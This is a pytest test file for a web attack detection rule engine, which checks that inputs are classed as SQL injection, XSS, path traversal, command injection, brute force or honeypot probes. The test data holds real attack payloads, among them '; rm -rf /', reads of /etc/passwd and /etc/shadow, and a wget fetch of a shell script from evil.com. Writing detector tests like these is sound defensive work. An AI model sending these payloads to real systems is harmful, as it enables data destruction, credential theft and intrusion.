"""
Phase 8: Rule Engine Tests
"""
import sys
import os
import pytest

# Add backend to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from dataclasses import dataclass, field
from datetime import datetime
from detection.rule_engine import check_rules


@dataclass
class MockCtx:
    ip: str = "1.2.3.4"
    method: str = "GET"
    path: str = "/api/test"
    user_agent: str = "Mozilla/5.0"
    payload: dict = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.utcnow)
    session_id: str = "test-session"
    _rate_1m: int = 1


# ── SQL Injection ──────────────────────────────────────────────────────────────
@pytest.mark.parametrize("payload", [
    {"q": "' OR 1=1--"},
    {"search": "UNION SELECT * FROM users"},
    {"id": "1; SELECT * FROM passwords"},
    {"input": "SLEEP(5)"},
    {"data": "1' OR '1'='1"},
])
def test_sqli_detection(payload):
    ctx = MockCtx(payload=payload)
    result = check_rules(ctx)
    assert result.attack_type == "SQL_INJECTION"
    assert result.severity == 9
    assert result.matched_pattern != ""


# ── XSS ───────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("payload", [
    {"comment": "<script>alert('XSS')</script>"},
    {"name": "<img src=x onerror=alert(1)>"},
    {"data": "javascript:alert(1)"},
    {"input": "<iframe src='evil.com'>"},
    {"val": "<svg onload=alert(1)>"},
])
def test_xss_detection(payload):
    ctx = MockCtx(payload=payload)
    result = check_rules(ctx)
    assert result.attack_type == "XSS"
    assert result.severity == 8


# ── Path Traversal ────────────────────────────────────────────────────────────
@pytest.mark.parametrize("path", [
    "/api/files?name=../../etc/passwd",
    "/download?file=../../../etc/shadow",
    "/view?path=%2e%2e%2fetc%2fpasswd",
    "/static/../../etc/passwd",
])
def test_path_traversal_detection(path):
    ctx = MockCtx(path=path, payload={"file": path})
    result = check_rules(ctx)
    assert result.attack_type == "PATH_TRAVERSAL"
    assert result.severity == 7


# ── Command Injection ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("payload", [
    {"cmd": "; rm -rf /"},
    {"input": "; ls -la"},
    {"data": "&& cat /etc/passwd"},
    {"val": "; wget http://evil.com/shell.sh"},
])
def test_command_injection_detection(payload):
    ctx = MockCtx(payload=payload)
    result = check_rules(ctx)
    assert result.attack_type == "COMMAND_INJECTION"
    assert result.severity == 10


# ── Brute Force ────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("rate", [11, 20, 50])
def test_brute_force_detection(rate):
    ctx = MockCtx(path="/api/auth/login", method="POST", payload={"username": "admin", "password": "test"})
    ctx._rate_1m = rate
    result = check_rules(ctx)
    assert result.attack_type == "BRUTE_FORCE"
    assert result.severity == 6


def test_brute_force_not_triggered_low_rate():
    ctx = MockCtx(path="/api/auth/login", method="POST", payload={"username": "admin"})
    ctx._rate_1m = 3
    result = check_rules(ctx)
    assert result.attack_type != "BRUTE_FORCE"


# ── Honeypot ───────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("path", [
    "/admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/.env",
    "/xmlrpc.php",
    "/.git/config",
])
def test_honeypot_paths(path):
    ctx = MockCtx(path=path)
    result = check_rules(ctx)
    assert result.attack_type == "HONEYPOT_TRAP"
    assert result.severity == 10


# ── Clean Request ──────────────────────────────────────────────────────────────
def test_clean_request():
    ctx = MockCtx(path="/api/products", payload={"page": 1, "limit": 20})
    ctx._rate_1m = 2
    result = check_rules(ctx)
    assert result.attack_type is None
    assert result.severity == 0
